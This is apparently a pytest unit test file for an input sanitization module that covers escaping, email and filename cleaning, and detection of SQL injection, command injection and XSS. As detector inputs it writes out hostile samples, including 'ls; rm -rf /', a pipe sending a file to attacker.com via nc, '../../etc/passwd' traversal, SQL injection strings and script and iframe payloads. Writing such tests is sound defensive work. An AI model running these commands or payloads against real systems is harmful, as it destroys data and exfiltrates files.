"""
Unit tests for Input Sanitization
"""

import pytest
from app.core.input_sanitization import InputSanitizer, sanitize_dict


class TestInputSanitizer:
    """Test InputSanitizer class"""
    
    def test_sanitize_string_basic(self):
        """Test basic string sanitization"""
        result = InputSanitizer.sanitize_string("  hello world  ")
        assert result == "hello world"
    
    def test_sanitize_string_html_escape(self):
        """Test HTML escaping"""
        result = InputSanitizer.sanitize_string("<script>alert('xss')</script>")
        assert "&lt;" in result
        assert "&gt;" in result
        assert "<script>" not in result
    
    def test_sanitize_string_allow_html(self):
        """Test allowing HTML tags"""
        html = "<p>Hello</p>"
        result = InputSanitizer.sanitize_string(html, allow_html=True)
        assert result == html
    
    def test_sanitize_string_max_length(self):
        """Test max length enforcement"""
        long_string = "a" * 100
        result = InputSanitizer.sanitize_string(long_string, max_length=50)
        assert len(result) == 50
    
    def test_sanitize_string_null_bytes(self):
        """Test null byte removal"""
        result = InputSanitizer.sanitize_string("hello\x00world")
        assert "\x00" not in result
        assert result == "helloworld"
    
    def test_sanitize_string_no_strip(self):
        """Test without stripping whitespace"""
        result = InputSanitizer.sanitize_string("  hello  ", strip_whitespace=False)
        assert result == "  hello  "
    
    def test_sanitize_string_non_string_input(self):
        """Test sanitizing non-string input"""
        result = InputSanitizer.sanitize_string(123)
        assert result == "123"
    
    def test_sanitize_email_valid(self):
        """Test valid email sanitization"""
        result = InputSanitizer.sanitize_email("  Test@Example.COM  ")
        assert result == "test@example.com"
    
    def test_sanitize_email_invalid_format(self):
        """Test invalid email format"""
        with pytest.raises(ValueError, match="Invalid email format"):
            InputSanitizer.sanitize_email("not-an-email")
    
    def test_sanitize_email_missing_domain(self):
        """Test email without domain"""
        with pytest.raises(ValueError, match="Invalid email format"):
            InputSanitizer.sanitize_email("user@")
    
    def test_sanitize_email_missing_at(self):
        """Test email without @ symbol"""
        with pytest.raises(ValueError, match="Invalid email format"):
            InputSanitizer.sanitize_email("userexample.com")
    
    def test_sanitize_filename_basic(self):
        """Test basic filename sanitization"""
        result = InputSanitizer.sanitize_filename("test_file.txt")
        assert result == "test_file.txt"
    
    def test_sanitize_filename_path_traversal(self):
        """Test path traversal prevention"""
        result = InputSanitizer.sanitize_filename("../../etc/passwd")
        assert result == "passwd"
        assert ".." not in result
        assert "/" not in result
    
    def test_sanitize_filename_windows_path(self):
        """Test Windows path removal"""
        result = InputSanitizer.sanitize_filename("C:\\Windows\\System32\\file.txt")
        assert result == "file.txt"
    
    def test_sanitize_filename_dangerous_chars(self):
        """Test removal of dangerous characters"""
        result = InputSanitizer.sanitize_filename("file<>:|?.txt")
        assert "<" not in result
        assert ">" not in result
        assert ":" not in result
    
    def test_sanitize_filename_leading_dots(self):
        """Test removal of leading dots"""
        result = InputSanitizer.sanitize_filename("...hidden.txt")
        assert not result.startswith(".")
    
    def test_sanitize_filename_max_length(self):
        """Test filename length limit"""
        long_name = "a" * 300 + ".txt"
        result = InputSanitizer.sanitize_filename(long_name)
        assert len(result) <= 255
    
    def test_check_sql_injection_select(self):
        """Test SQL injection detection - SELECT"""
        assert InputSanitizer.check_sql_injection("SELECT * FROM users") is True
    
    def test_check_sql_injection_union(self):
        """Test SQL injection detection - UNION"""
        assert InputSanitizer.check_sql_injection("1' OR '1'='1") is True
    
    def test_check_sql_injection_comment(self):
        """Test SQL injection detection - SQL comments"""
        assert InputSanitizer.check_sql_injection("admin'--") is True
    
    def test_check_sql_injection_clean(self):
        """Test clean input passes SQL injection check"""
        assert InputSanitizer.check_sql_injection("normal text") is False
    
    def test_check_command_injection_semicolon(self):
        """Test command injection detection - semicolon"""
        assert InputSanitizer.check_command_injection("ls; rm -rf /") is True
    
    def test_check_command_injection_pipe(self):
        """Test command injection detection - pipe"""
        assert InputSanitizer.check_command_injection("cat file | nc attacker.com") is True
    
    def test_check_command_injection_backtick(self):
        """Test command injection detection - backtick"""
        assert InputSanitizer.check_command_injection("echo `whoami`") is True
    
    def test_check_command_injection_path_traversal(self):
        """Test command injection detection - path traversal"""
        assert InputSanitizer.check_command_injection("../../etc/passwd") is True
    
    def test_check_command_injection_clean(self):
        """Test clean input passes command injection check"""
        assert InputSanitizer.check_command_injection("normal text") is False
    
    def test_check_xss_script_tag(self):
        """Test XSS detection - script tag"""
        assert InputSanitizer.check_xss("<script>alert('xss')</script>") is True
    
    def test_check_xss_javascript_protocol(self):
        """Test XSS detection - javascript: protocol"""
        assert InputSanitizer.check_xss("javascript:alert('xss')") is True
    
    def test_check_xss_event_handler(self):
        """Test XSS detection - event handler"""
        assert InputSanitizer.check_xss("<img onerror='alert(1)'>") is True
    
    def test_check_xss_iframe(self):
        """Test XSS detection - iframe"""
        assert InputSanitizer.check_xss("<iframe src='evil.com'>") is True
    
    def test_check_xss_clean(self):
        """Test clean input passes XSS check"""
        assert InputSanitizer.check_xss("normal text") is False
    
    def test_sanitize_and_validate_success(self):
        """Test comprehensive sanitization and validation"""
        result = InputSanitizer.sanitize_and_validate(
            "  hello world  ",
            field_name="test_field",
            max_length=100
        )
        assert result == "hello world"
    
    def test_sanitize_and_validate_sql_injection(self):
        """Test sanitization rejects SQL injection"""
        with pytest.raises(ValueError, match="SQL injection"):
            InputSanitizer.sanitize_and_validate(
                "SELECT * FROM users",
                field_name="test_field"
            )
    
    def test_sanitize_and_validate_xss(self):
        """Test sanitization rejects XSS"""
        with pytest.raises(ValueError, match="XSS"):
            InputSanitizer.sanitize_and_validate(
                "<script>alert('xss')</script>",
                field_name="test_field"
            )
    
    def test_sanitize_and_validate_command_injection(self):
        """Test sanitization rejects command injection"""
        with pytest.raises(ValueError, match="Command injection"):
            InputSanitizer.sanitize_and_validate(
                "ls; rm -rf /",
                field_name="test_field"
            )
    
    def test_sanitize_and_validate_skip_injection_check(self):
        """Test sanitization without injection check"""
        result = InputSanitizer.sanitize_and_validate(
            "SELECT * FROM users",
            field_name="test_field",
            check_injection=False
        )
        assert "SELECT" in result


class TestSanitizeDict:
    """Test sanitize_dict function"""
    
    def test_sanitize_dict_basic(self):
        """Test basic dictionary sanitization"""
        data = {"key": "  value  "}
        result = sanitize_dict(data)
        assert result["key"] == "value"
    
    def test_sanitize_dict_nested(self):
        """Test nested dictionary sanitization"""
        data = {
            "outer": {
                "inner": "  value  "
            }
        }
        result = sanitize_dict(data)
        assert result["outer"]["inner"] == "value"
    
    def test_sanitize_dict_list_values(self):
        """Test sanitization of list values"""
        data = {
            "items": ["  item1  ", "  item2  "]
        }
        result = sanitize_dict(data)
        assert result["items"] == ["item1", "item2"]
    
    def test_sanitize_dict_html_escape(self):
        """Test HTML escaping in dictionary"""
        data = {"html": "<script>alert('xss')</script>"}
        result = sanitize_dict(data)
        assert "<script>" not in result["html"]
        assert "&lt;" in result["html"]
    
    def test_sanitize_dict_max_length(self):
        """Test max length enforcement in dictionary"""
        data = {"long": "a" * 2000}
        result = sanitize_dict(data, max_string_length=100)
        assert len(result["long"]) == 100
    
    def test_sanitize_dict_allow_html(self):
        """Test allowing HTML in dictionary"""
        data = {"html": "<p>Hello</p>"}
        result = sanitize_dict(data, allow_html=True)
        assert result["html"] == "<p>Hello</p>"
    
    def test_sanitize_dict_key_sanitization(self):
        """Test key sanitization"""
        data = {"  key  ": "value"}
        result = sanitize_dict(data)
        assert "key" in result
        assert "  key  " not in result
    
    def test_sanitize_dict_mixed_types(self):
        """Test dictionary with mixed value types"""
        data = {
            "string": "  text  ",
            "number": 123,
            "bool": True,
            "none": None
        }
        result = sanitize_dict(data)
        assert result["string"] == "text"
        assert result["number"] == 123
        assert result["bool"] is True
        assert result["none"] is None
